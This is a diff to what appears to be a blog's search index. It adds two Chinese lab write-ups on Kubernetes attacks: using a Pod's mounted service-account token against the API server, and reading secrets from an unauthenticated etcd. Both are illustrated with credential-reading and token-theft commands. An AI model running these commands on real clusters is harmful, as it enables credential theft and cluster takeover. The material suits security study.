@@ -4,6 +4,60 @@
   
     
     <entry>
+      <title>利用Service Account连接API Server</title>
+      <link href="/2025/03/21/%E5%88%A9%E7%94%A8Service-Account%E8%BF%9E%E6%8E%A5API-Server/"/>
+      <url>/2025/03/21/%E5%88%A9%E7%94%A8Service-Account%E8%BF%9E%E6%8E%A5API-Server/</url>
+      
+        <content type="html"><![CDATA[<p>k8s有两种账户：用户账户和服务账户，用户账户被用于人与集群交互（如管理员管理集群），服务账户用于Pod与集群交互（如Pod调用api server提供的一些API进行一些活动）</p><p>如果我们入侵了一台有着高权限服务账户的Pod，我们就可以用它对应的服务账户身份调用api server向集群下达命令。默认的user或者service account并不具备任何权限,因为配置了RBAC权限。如运维配置不当没有设置RBAC（基于角色的访问控制）,那么攻击者就可以通过Pod获取到Token进行API Server认证。在较低版本v1.15.11中,Kubernetes默认是不会开启RBAC控制，从1.16版本起，默认启用RBAC访问控制策略。从1.18开始，RBAC已作为稳定的功能。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>pod的serviceaccount信息一般存放于&#x2F;var&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;目录下</p><p>​<img src="/assets/image-20250212142638-6enedmx.png" alt="image">​</p><p>使用一个高权限的service account和一个Pod关联，模拟环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#创建账户</span><br><span class="line">kubectl create serviceaccount suifeng</span><br><span class="line">#把suifeng放入集群管理员组，给予高权限</span><br><span class="line">kubectl create clusterrolebinding cluster-admin-suifeng  --clusterrole=cluster-admin --serviceaccount=default:suifeng</span><br></pre></td></tr></table></figure><p>然后将service account与pod相关联</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">spec:</span><br><span class="line">  serviceAccountName: suifeng</span><br><span class="line">  containers:</span><br><span class="line">  - name: test-444</span><br><span class="line">    image: nginx:1.14.2</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - name: host</span><br><span class="line">      mountPath: /host</span><br><span class="line">  volumes:</span><br><span class="line">  - name: host</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br><span class="line">      type: Directory</span><br></pre></td></tr></table></figure><p>​<img src="/assets/image-20250212143345-wasssmg.png" alt="image">​</p><p>创建pod</p><p>​<img src="/assets/image-20250212143440-ujeqh00.png" alt="image">​</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在pod里设置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt</span><br><span class="line">TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)</span><br><span class="line">NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)</span><br></pre></td></tr></table></figure><p>​<img src="/assets/image-20250212143940-csmr040.png" alt="image">​</p><p>利用相关凭证对api发起请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert $CA_CERT -H &quot;Authorization: Bearer $TOKEN&quot; &quot;https://192.168.230.128:6443/version&quot;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/image-20250212150534-rx6nhee.png" alt="image">​</p><p>‍</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 云安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 云安全 </tag>
+            
+            <tag> k8s </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>etcd未授权访问</title>
+      <link href="/2025/03/21/etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+      <url>/2025/03/21/etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
+      
+        <content type="html"><![CDATA[<p>etcd是一个一致且高可用的键值存储，用作 Kubernetes 所有集群数据的后台数据库。如果管理员配置不当，导致etcd未授权访问的情况攻击者可获取大量的集群关键信息，从而接管集群。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>修改配置文件&#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;etcd.yaml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#client-cert-auth改为false</span><br><span class="line">- --client-cert-auth=false</span><br></pre></td></tr></table></figure><p>​<img src="/assets/image-20250212092522-ba2orod.png" alt="image">​</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接web访问</p><p>​<img src="/assets/image-20250212092602-17unpmv.png" alt="image">​</p><p>使用etcdctl工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#工具地址</span><br><span class="line">https://github.com/etcd-io/etcd/releases/download/v3.4.9/etcd-v3.4.9-linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p>使用 etcdctl 工具获取 etcd 键空间中的所有键，不获取键对应的值，同时跳过 TLS 证书验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://192.168.230.142:2379/ get / --prefix --keys-only</span><br></pre></td></tr></table></figure><p>​<img src="/assets/image-20250212093130-97pco8a.png" alt="image">​</p><p>使用 grep 命令来过滤出包含 “&#x2F;secrets&#x2F;kube-system&#x2F;clusterrole” 的键，查找 etcd 中与 Kubernetes 集群中 kube-system 命名空间的集群角色相关的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://192.168.230.142:2379/ get --keys-only --prefix=true &quot;/&quot; | grep /secrets/kube-system</span><br></pre></td></tr></table></figure><p>​<img src="/assets/image-20250212093526-xaafmo7.png" alt="image">​</p><p>读取与 Kubernetes 集群中 kube-system 命名空间相关的密钥token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://192.168.230.142:2379/ get /registry/secrets/kube-system/default-token-z6hzx</span><br></pre></td></tr></table></figure><p>​<img src="/assets/image-20250212094306-rymayqx.png" alt="image">​</p><p>利用高权限token访问apiserver</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --insecure-skip-tls-verify -s https://192.168.230.142:6443/ --token=“[.token.]” -n kube-system get pods</span><br></pre></td></tr></table></figure><p>​<img src="/assets/image-20250212095655-9kqfbxa.png" alt="image">​</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 云安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 云安全 </tag>
+            
+            <tag> k8s </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Docker daemon2375端口公网暴露</title>
       <link href="/2025/03/03/Docker-daemon2375%E7%AB%AF%E5%8F%A3%E5%85%AC%E7%BD%91%E6%9A%B4%E9%9C%B2/"/>
       <url>/2025/03/03/Docker-daemon2375%E7%AB%AF%E5%8F%A3%E5%85%AC%E7%BD%91%E6%9A%B4%E9%9C%B2/</url>
@@ -687,9 +741,9 @@
       
         <tags>
             
-            <tag> 网安故事 </tag>
-            
             <tag> 生活随记 </tag>
+            
+            <tag> 网安故事 </tag>
             
         </tags>
       
